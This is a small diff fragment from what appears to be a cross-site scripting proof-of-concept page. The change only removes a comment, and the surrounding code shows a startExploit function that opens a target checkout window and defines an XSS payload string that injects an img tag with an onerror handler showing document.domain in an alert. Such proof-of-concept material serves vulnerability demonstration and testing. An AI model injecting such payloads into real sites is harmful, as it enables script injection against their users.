@@ -19,7 +19,7 @@
 
         function startExploit() {
             log("Opening target window...");
-            // Open the checkout page
+
             var win = window.open(targetUrl, "targetWindow");
 
             const xssPayload = "0x\"><img src=x onerror=alert(document.domain)>";
